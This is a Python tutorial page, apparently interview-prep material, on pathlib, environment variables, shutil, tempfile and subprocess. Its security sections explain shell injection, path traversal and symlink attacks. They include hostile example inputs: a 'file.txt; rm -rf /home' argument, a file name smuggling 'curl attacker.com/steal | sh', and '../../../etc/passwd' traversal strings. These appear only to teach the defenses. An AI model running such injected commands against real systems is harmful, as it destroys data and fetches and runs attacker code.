---
title: pathlib & OS Interaction
outline: deep
---

# pathlib & OS Interaction

Interview weight: 🔥🔥 | Python 3.4+ for `pathlib`, 3.12+ for `Path.walk()` | Prerequisites: [Module 6 — Error Handling](/python/module-06/), [Module 1 — Data Model](/python/module-01/)

## 🗣️ In Plain English

::: tip In Plain English
Think of `pathlib.Path` as a GPS navigator for your filesystem. The old way of working with paths (`os.path`) was like getting directions as a series of disconnected text instructions: "take the string `/home`, concatenate a slash, concatenate `user`, concatenate another slash, concatenate `documents`." If you made a typo in one of those joins, you got a wrong string and had no way of knowing until you tried to use it.

The GPS navigator (a `Path` object) is different. It *understands* paths as structured routes, not dumb strings. You can combine routes by pressing one button (the `/` operator), ask "where am I relative to this other point?" (`.relative_to()`), or say "go up one level" (`.parent`). The navigator handles all the details of whether you are on a Windows road system or a Unix one. You never manually glue slashes together again.

For copying, moving, and archiving entire folder trees, `pathlib` hands off to `shutil` — think of `shutil` as a moving company. You point at a source and a destination, and the movers handle the heavy lifting: recursive copies, preserving timestamps, packing everything into a ZIP archive.

When you need a scratch pad that cleans itself up, `tempfile` is the disposable notebook. You write whatever you need, and when you close the notebook (leave the `with` block), it shreds itself. This is important for security: the notebook has a random name so nobody else can guess it and peek at your notes.

Then there is `subprocess.run()`. This is like hiring a courier. You give them an errand — "run this shell command" — they go do it independently, and bring back the result: what the command printed, whether it succeeded, and its exit code. The critical safety rule: *always hand the courier a written list of instructions* (a list of arguments), never a single verbal sentence (a shell string). A verbal sentence can be misunderstood if someone sneaks extra words into it — that is shell injection, and it is one of the most common security vulnerabilities in backend code.
:::

## ⚙️ Under the Hood

### pathlib.Path: The Object-Oriented Filesystem API

`pathlib` was added in Python 3.4 to replace the string-based `os.path` module. The core idea: a `Path` object is not a string — it is a structured representation of a filesystem location with methods for every common operation.

#### Creating Paths and the `/` Operator

```python
# run: python3 pathlib_basics.py
"""Path creation and the / operator for joining."""

from pathlib import Path

# From a string
home = Path("/home/user")

# The / operator joins path segments — __truediv__ is overloaded
config = home / ".config" / "myapp" / "settings.json"
print(config)          # /home/user/.config/myapp/settings.json
print(type(config))    # <class 'pathlib.PosixPath'>  (or WindowsPath on Windows)

# Current directory and home directory
cwd = Path.cwd()
home_dir = Path.home()
print(f"CWD: {cwd}")
print(f"Home: {home_dir}")

# From multiple parts
log_path = Path("var", "log", "app", "error.log")
print(log_path)  # var/log/app/error.log (relative path)
```

#### Path Properties: Dissecting a Path

```python
# run: python3 path_properties.py
"""Path properties for extracting components."""

from pathlib import Path

p = Path("/home/user/projects/app/data/report.tar.gz")

print(f".name:     {p.name}")       # report.tar.gz  (final component)
print(f".stem:     {p.stem}")       # report.tar     (name minus LAST suffix)
print(f".suffix:   {p.suffix}")     # .gz            (last suffix only)
print(f".suffixes: {p.suffixes}")   # ['.tar', '.gz']
print(f".parent:   {p.parent}")     # /home/user/projects/app/data
print(f".parts:    {p.parts}")      # ('/', 'home', 'user', 'projects', 'app', 'data', 'report.tar.gz')
print(f".anchor:   {p.anchor}")     # /              (root on POSIX, e.g. C:\ on Windows)

# .parent is itself a Path, so you can chain
grandparent = p.parent.parent
print(f"grandparent: {grandparent}")  # /home/user/projects/app

# Changing the suffix
csv_path = p.with_suffix(".csv")
print(f"with_suffix: {csv_path}")     # /home/user/projects/app/data/report.tar.csv
# NOTE: only replaces the LAST suffix

# Changing the name entirely
renamed = p.with_name("output.json")
print(f"with_name: {renamed}")        # /home/user/projects/app/data/output.json

# Changing just the stem (Python 3.9+)
new_stem = p.with_stem("summary")
print(f"with_stem: {new_stem}")       # /home/user/projects/app/data/summary.gz
```

#### Filesystem Queries and Directory Traversal

```python
# run: python3 path_queries.py
"""Filesystem queries: exists, is_file, iterdir, glob."""

from pathlib import Path

p = Path(".")

# Existence and type checks
print(p.exists())     # True
print(p.is_dir())     # True
print(p.is_file())    # False

# iterdir: immediate children (non-recursive)
print("\n--- Direct children ---")
for child in sorted(p.iterdir()):
    kind = "DIR " if child.is_dir() else "FILE"
    print(f"  {kind}  {child.name}")

# glob: pattern matching (non-recursive by default)
print("\n--- All .py files in current dir ---")
for py_file in p.glob("*.py"):
    print(f"  {py_file}")

# rglob: recursive glob (equivalent to glob("**/*.py"))
print("\n--- All .py files recursively ---")
for py_file in p.rglob("*.py"):
    print(f"  {py_file}")

# mkdir with parents=True and exist_ok=True
output_dir = Path("output") / "reports" / "2024"
output_dir.mkdir(parents=True, exist_ok=True)
print(f"\nCreated: {output_dir} (exists: {output_dir.exists()})")

# Cleanup for demo
import shutil
shutil.rmtree("output")
```

#### Reading and Writing Files

```python
# run: python3 path_io.py
"""Path.read_text / write_text — the one-liner file I/O."""

from pathlib import Path

data_file = Path("demo_output.txt")

# Write (creates or overwrites)
data_file.write_text("line one\nline two\nline three\n", encoding="utf-8")

# Read entire file as a string
content = data_file.read_text(encoding="utf-8")
print(content)

# Binary equivalents
data_file.write_bytes(b"\x89PNG\r\n\x1a\n")  # fake PNG header
raw = data_file.read_bytes()
print(f"First 4 bytes: {raw[:4]}")  # b'\x89PNG'

# IMPORTANT: These methods open, read/write, and close in one call.
# For large files or line-by-line processing, use open():
with data_file.open("w", encoding="utf-8") as f:
    for i in range(5):
        f.write(f"record {i}\n")

# Path works as the argument to open() — but Path.open() is more idiomatic
with data_file.open(encoding="utf-8") as f:
    for line in f:
        print(line.rstrip())

# Cleanup
data_file.unlink()
```

#### resolve(): Absolute Paths and Symlink Resolution

```python
# run: python3 path_resolve.py
"""resolve() — getting canonical absolute paths."""

from pathlib import Path

relative = Path("../some_dir/../other/./file.txt")

# resolve() does three things:
# 1. Makes the path absolute (relative to cwd)
# 2. Resolves .. and . components
# 3. Resolves symlinks (follows them to the real target)
absolute = relative.resolve()
print(f"Resolved: {absolute}")

# is_absolute() check
print(f"Relative is absolute: {relative.is_absolute()}")   # False
print(f"Resolved is absolute: {absolute.is_absolute()}")   # True

# SECURITY NOTE: resolve() is critical for preventing path traversal attacks.
# If a user supplies "../../../etc/passwd", resolve it and check that the
# result is still within your allowed directory:
user_input = "../../../etc/passwd"
base_dir = Path("/app/uploads").resolve()
requested = (base_dir / user_input).resolve()

if not str(requested).startswith(str(base_dir)):
    print(f"BLOCKED: {requested} is outside {base_dir}")
else:
    print(f"OK: {requested}")
```

### os.path vs pathlib: Migration Table

| Operation | `os.path` (old) | `pathlib` (modern) |
|-----------|------------------|--------------------|
| Join paths | `os.path.join(a, b)` | `Path(a) / b` |
| Get filename | `os.path.basename(p)` | `p.name` |
| Get directory | `os.path.dirname(p)` | `p.parent` |
| Get extension | `os.path.splitext(p)[1]` | `p.suffix` |
| Check exists | `os.path.exists(p)` | `p.exists()` |
| Check is file | `os.path.isfile(p)` | `p.is_file()` |
| Absolute path | `os.path.abspath(p)` | `p.resolve()` |
| Get size | `os.path.getsize(p)` | `p.stat().st_size` |
| List directory | `os.listdir(p)` | `p.iterdir()` |
| Glob | `glob.glob("*.py")` | `p.glob("*.py")` |
| Read file | `open(p).read()` | `p.read_text()` |
| Home directory | `os.path.expanduser("~")` | `Path.home()` |

**Rule of thumb:** for new code, always use `pathlib`. The only time `os.path` is unavoidable is when a third-party library requires string paths — and even then, `str(path_obj)` converts cleanly.

### os.environ: Environment Variables

```python
# run: python3 env_vars.py
"""Working with environment variables."""

import os

# Read (raises KeyError if missing)
try:
    db_url = os.environ["DATABASE_URL"]
except KeyError:
    print("DATABASE_URL not set")

# Read with default (returns None or your default if missing)
debug = os.environ.get("DEBUG", "false")
print(f"DEBUG={debug}")

# os.getenv is an alias for os.environ.get
port = os.getenv("PORT", "8000")
print(f"PORT={port}")

# Set (affects current process and children, NOT parent shell)
os.environ["MY_APP_MODE"] = "testing"
print(f"MY_APP_MODE={os.environ['MY_APP_MODE']}")

# Delete
del os.environ["MY_APP_MODE"]

# Iterate all env vars
print(f"\nTotal env vars: {len(os.environ)}")
for key in sorted(os.environ)[:5]:
    print(f"  {key}={os.environ[key][:40]}...")

# IMPORTANT: os.environ is a dict-like mapping but it's backed by the
# actual process environment. Changes are reflected in child processes
# spawned via subprocess.
```

### shutil: High-Level File Operations

```python
# run: python3 shutil_demo.py
"""shutil — copying, moving, archiving, disk usage."""

import shutil
from pathlib import Path

# Setup demo structure
base = Path("shutil_demo")
src = base / "source"
src.mkdir(parents=True, exist_ok=True)
(src / "data.txt").write_text("important data")
(src / "config.ini").write_text("[app]\nmode=prod")

# copy2: copy file preserving metadata (timestamps, permissions)
dest_file = base / "data_backup.txt"
shutil.copy2(src / "data.txt", dest_file)
print(f"Copied file: {dest_file.exists()}")

# copytree: recursive directory copy
dst = base / "source_backup"
shutil.copytree(src, dst)
print(f"Copied tree: {list(dst.iterdir())}")

# move: works across filesystems (copy + delete if needed)
shutil.move(str(dest_file), str(base / "moved_data.txt"))
print(f"Moved: {(base / 'moved_data.txt').exists()}")

# make_archive: create zip/tar/gztar archives
archive_path = shutil.make_archive(
    base_name=str(base / "source_archive"),  # without extension
    format="zip",
    root_dir=str(base),
    base_dir="source",
)
print(f"Archive created: {archive_path}")

# disk_usage: total, used, free space
usage = shutil.disk_usage("/")
print(f"\nDisk: {usage.total // (1024**3)} GB total, "
      f"{usage.used // (1024**3)} GB used, "
      f"{usage.free // (1024**3)} GB free")

# rmtree: recursive delete — DANGEROUS, no undo
shutil.rmtree(base)
print(f"\nCleaned up: {not base.exists()}")
```

### tempfile: Secure Temporary Storage

```python
# run: python3 tempfile_demo.py
"""tempfile — temporary files and directories with automatic cleanup."""

import tempfile
from pathlib import Path

# NamedTemporaryFile: auto-deleted when closed (by default)
with tempfile.NamedTemporaryFile(
    mode="w",
    suffix=".json",
    prefix="myapp_",
    # delete=False  # uncomment to keep the file after closing
) as tmp:
    tmp.write('{"key": "value"}')
    tmp.flush()  # ensure data is written to disk
    print(f"Temp file: {tmp.name}")
    print(f"Exists during with: {Path(tmp.name).exists()}")

# File is auto-deleted after the with block
# print(f"Exists after with: {Path(tmp.name).exists()}")  # False

# TemporaryDirectory: auto-deleted when context exits
with tempfile.TemporaryDirectory(prefix="myapp_") as tmpdir:
    tmpdir_path = Path(tmpdir)
    data_file = tmpdir_path / "processing" / "chunk_001.bin"
    data_file.parent.mkdir(parents=True)
    data_file.write_bytes(b"\x00" * 1024)
    print(f"\nTemp dir: {tmpdir}")
    print(f"File in temp dir: {data_file.exists()}")

# Entire directory tree deleted after with block

# mkstemp / mkdtemp: low-level, caller responsible for cleanup
fd, path = tempfile.mkstemp(suffix=".tmp")
import os
os.write(fd, b"low-level temp data")
os.close(fd)
os.unlink(path)  # manual cleanup required
print(f"\nLow-level temp file cleaned up: {not Path(path).exists()}")

# SECURITY: tempfile uses os.urandom for names, making them unpredictable.
# Never construct temp paths manually (e.g., "/tmp/myapp_cache") —
# an attacker could create a symlink at that predictable path pointing
# to a sensitive file, and your app would overwrite it.
print(f"\nDefault temp dir: {tempfile.gettempdir()}")
```

### subprocess: Running External Commands

#### Basic Usage with subprocess.run()

```python
# run: python3 subprocess_basics.py
"""subprocess.run() — the recommended way to run external commands."""

import subprocess

# Basic invocation — command as a LIST (safe)
result = subprocess.run(
    ["echo", "hello", "world"],
    capture_output=True,  # capture stdout and stderr
    text=True,            # decode bytes to str (using locale encoding)
    check=False,          # don't raise on non-zero exit code (default)
)

print(f"stdout: {result.stdout.strip()}")   # hello world
print(f"stderr: {result.stderr!r}")          # ''
print(f"returncode: {result.returncode}")    # 0
print(f"type: {type(result)}")               # CompletedProcess

# check=True raises CalledProcessError on non-zero exit
try:
    subprocess.run(
        ["python3", "-c", "import sys; sys.exit(1)"],
        capture_output=True,
        text=True,
        check=True,
    )
except subprocess.CalledProcessError as e:
    print(f"\nCommand failed with exit code {e.returncode}")
    print(f"stderr: {e.stderr!r}")

# timeout: kill the process if it takes too long
try:
    subprocess.run(
        ["sleep", "10"],
        timeout=1,  # seconds
    )
except subprocess.TimeoutExpired:
    print("\nProcess killed after 1 second timeout")

# Passing input to stdin
result = subprocess.run(
    ["python3", "-c", "import sys; print(sys.stdin.read().upper())"],
    input="hello from parent",
    capture_output=True,
    text=True,
)
print(f"\nStdin result: {result.stdout.strip()}")  # HELLO FROM PARENT
```

#### Security: shell=True is a Loaded Gun

```python
# run: python3 subprocess_security.py
"""Why shell=True is dangerous and how to avoid it."""

import subprocess

# THE VULNERABILITY: shell=True passes the command to /bin/sh -c
# If any part of the command comes from user input, injection is possible.

user_input = "file.txt; rm -rf /home"  # malicious input

# DANGEROUS — shell=True with string interpolation
# subprocess.run(f"cat {user_input}", shell=True)  # DO NOT RUN THIS
# The shell sees: cat file.txt; rm -rf /home
# It executes BOTH commands.

print("--- Demonstrating the difference ---")

# SAFE: list of arguments, no shell interpretation
# The semicolon is treated as part of the filename, not a command separator
result = subprocess.run(
    ["echo", user_input],  # echo treats entire string as one argument
    capture_output=True,
    text=True,
)
print(f"Safe (list): {result.stdout.strip()}")
# Output: file.txt; rm -rf /home  (literal string, not executed)

# SAFE: if you need shell features (pipes, globbing), use list + explicit piping
# Instead of: subprocess.run("ls | grep .py", shell=True)
# Do this:
ls_proc = subprocess.run(["ls"], capture_output=True, text=True)
grep_proc = subprocess.run(
    ["grep", ".py"],
    input=ls_proc.stdout,
    capture_output=True,
    text=True,
)
print(f"Safe pipe: found {len(grep_proc.stdout.splitlines())} .py files")

# WHEN shell=True IS ACCEPTABLE:
# 1. The command string is entirely hardcoded (no user input whatsoever)
# 2. You need shell features AND the input is rigorously validated
# 3. Even then, prefer shlex.quote() for escaping:
import shlex
safe_arg = shlex.quote(user_input)
print(f"shlex.quote: {safe_arg}")  # 'file.txt; rm -rf /home' (quoted)
```

#### subprocess.Popen: Streaming and Real-Time Output

```python
# run: python3 subprocess_popen.py
"""Popen for advanced use: streaming stdout, real-time processing."""

import subprocess
import sys

# Popen gives you control over the process lifecycle
# Use case: streaming long-running command output line by line
proc = subprocess.Popen(
    ["python3", "-c", """
import time, sys
for i in range(5):
    print(f"progress: {i+1}/5", flush=True)
    time.sleep(0.2)
print("done", flush=True)
"""],
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    text=True,
)

# Stream stdout line by line as it arrives
print("--- Real-time output ---")
for line in proc.stdout:  # type: ignore[union-attr]
    print(f"  received: {line.rstrip()}")

# Wait for completion and get return code
returncode = proc.wait()
print(f"Process exited with code {returncode}")

# DEADLOCK WARNING:
# If you read from proc.stdout while stderr fills its buffer,
# the child process blocks waiting for stderr to drain — deadlock.
# SOLUTION: use communicate() instead of manual reads when capturing both:

proc2 = subprocess.Popen(
    ["python3", "-c", "import sys; print('out'); print('err', file=sys.stderr)"],
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    text=True,
)
stdout, stderr = proc2.communicate(timeout=5)
print(f"\ncommunicate() stdout: {stdout.strip()}")
print(f"communicate() stderr: {stderr.strip()}")

# Or: redirect stderr to stdout to avoid the issue entirely
proc3 = subprocess.run(
    ["python3", "-c", "import sys; print('out'); print('err', file=sys.stderr)"],
    stdout=subprocess.PIPE,
    stderr=subprocess.STDOUT,  # merge stderr into stdout
    text=True,
)
print(f"\nMerged output: {proc3.stdout.strip()}")
```

## 💥 Where It Bites (Production Lens)

::: warning Where It Bites

**1. Path traversal via user input**
A web endpoint accepts a filename from the user and constructs a path: `uploads_dir / user_filename`. If the user sends `../../etc/passwd`, the resulting path escapes the uploads directory. **Symptom:** sensitive files served or overwritten. **Fix:** always `resolve()` the final path and verify it starts with the allowed base directory. Never trust user-supplied path components without canonicalization.

```python
# Safe pattern
base = Path("/app/uploads").resolve()
requested = (base / user_filename).resolve()
if not requested.is_relative_to(base):  # Python 3.9+
    raise ValueError(f"Path traversal blocked: {user_filename}")
```

**2. shell=True injection in subprocess**
A developer writes `subprocess.run(f"convert {user_file} output.png", shell=True)`. An attacker uploads a file named `; curl attacker.com/steal | sh ;.jpg`. The shell interprets the semicolons as command separators and executes the injected commands. **Symptom:** unexplained outbound network connections, data exfiltration, or crypto miners on your server. **Fix:** always pass commands as a list of arguments, never as a formatted string with `shell=True`.

**3. Temporary file race conditions with manual paths**
A developer creates temp files at predictable paths like `/tmp/myapp_cache.json` instead of using `tempfile`. An attacker creates a symlink at that path pointing to `/etc/crontab`. When the application writes its "cache," it actually overwrites the crontab. This is a classic **symlink attack** (CWE-59). **Symptom:** unexplained file modifications, privilege escalation. **Fix:** always use `tempfile.NamedTemporaryFile` or `tempfile.TemporaryDirectory`, which use cryptographically random names and secure creation flags (`O_EXCL`).

**4. subprocess deadlocks with PIPE**
A service spawns a child process with `stdout=PIPE, stderr=PIPE` and reads stdout in a loop. The child writes enough to stderr to fill the OS pipe buffer (typically 64 KB on Linux). The child blocks on the `stderr.write()` call, the parent blocks waiting for stdout — classic deadlock. **Symptom:** the process hangs indefinitely, health checks fail, the pod is killed by K8s. **Fix:** use `communicate()`, or redirect `stderr=subprocess.STDOUT`, or use separate threads to drain both pipes.
:::

## 🎯 Checkpoint

::: details Question 1 — Path traversal prevention
**Q:** A Flask endpoint serves files from an uploads directory. The user provides the filename as a query parameter. Write the path validation logic that prevents directory traversal, and explain why simply checking for `..` in the input string is insufficient.

**A:** Simply checking for `..` is insufficient because there are many ways to encode a traversal: URL encoding (`%2e%2e%2f`), double encoding, or OS-specific tricks. The correct approach is canonicalization:

```python
base = Path("/app/uploads").resolve()
requested = (base / user_filename).resolve()
if not requested.is_relative_to(base):
    raise ValueError("Path traversal attempt")
```

`resolve()` follows symlinks, resolves `..` and `.`, and produces the true absolute path. After resolution, you check that the canonical path still starts with the base directory. This handles all encoding tricks because the filesystem itself resolves the path. The `is_relative_to()` method (Python 3.9+) is cleaner than string prefix checking, which can fail on paths like `/app/uploads_evil` matching the prefix `/app/uploads`.
:::

::: details Question 2 — subprocess deadlock
**Q:** You have a subprocess that writes to both stdout and stderr. You read stdout line by line in a loop using `proc.stdout`. Under what conditions does this deadlock, and what are the solutions?

**A:** Deadlock occurs when the child writes enough to stderr to fill the OS pipe buffer (typically 64 KB on Linux). The child blocks on its `write()` to stderr, waiting for the parent to drain the pipe. But the parent is blocked reading from stdout, waiting for the child to produce more output. Neither can make progress.

Solutions: (1) Use `proc.communicate()`, which internally uses `select()` or threads to drain both pipes concurrently. (2) Redirect `stderr=subprocess.STDOUT` to merge both streams into one pipe. (3) Use `stderr=subprocess.DEVNULL` if you don't need error output. (4) Spawn a separate thread to drain stderr while the main thread reads stdout. For `subprocess.run()`, `capture_output=True` uses `communicate()` internally, so it's safe.
:::

::: details Question 3 — tempfile security
**Q:** Why is `tempfile.NamedTemporaryFile` more secure than manually creating a file at `/tmp/myapp_data.json`? What specific attack does it prevent?

**A:** `NamedTemporaryFile` prevents **symlink attacks** (CWE-59). When you create a file at a predictable path, an attacker who can write to `/tmp` (which is world-writable on Unix) can create a symlink at `/tmp/myapp_data.json` pointing to a sensitive file like `/etc/passwd` or `~/.ssh/authorized_keys`. When your application opens that path for writing, it follows the symlink and overwrites the target file.

`NamedTemporaryFile` defends against this by: (1) generating a cryptographically random filename using `os.urandom`, making the path unpredictable; (2) opening the file with `O_EXCL` (exclusive creation), which fails if the path already exists as any kind of file or symlink; (3) setting restrictive permissions (0600 by default). Together, these prevent an attacker from predicting the filename or pre-placing a symlink at that location.
:::

## Key Mental Models

- **Paths are objects, not strings.** `pathlib.Path` eliminates an entire class of bugs (wrong separators, missing slashes, platform differences) by treating paths as structured data with methods, not raw strings you concatenate.

- **subprocess: list of args is safe, shell string is dangerous.** The difference between `["cmd", arg]` and `f"cmd {arg}"` with `shell=True` is the difference between parameterized queries and SQL string concatenation — the same category of injection vulnerability.

- **resolve() is your path traversal firewall.** Canonicalize first, authorize second. Never make access decisions based on the *requested* path — always based on where the path *actually points* after symlink and `..` resolution.

- **tempfile randomness is a security feature, not a convenience.** Predictable temp paths are exploitable. The random names generated by `tempfile` are the defense against symlink attacks in world-writable directories.

- **communicate() prevents subprocess deadlocks.** Whenever you capture both stdout and stderr from a subprocess, use `communicate()` or `subprocess.run(capture_output=True)` — never manual reads from one pipe while the other can fill up.

## Related

- [Module 6 — Error Handling](/python/module-06/) — exception handling patterns used with subprocess and file operations
- [Module 8 — Imports & Packaging](/python/module-08/) — how `Path` objects interact with package discovery and `__file__`
- [Serialization — json, pickle & struct](./02-serialization.md) — reading/writing files whose content is serialized data
- [Logging & Datetime](./03-logging-datetime.md) — logging file operations and subprocess results
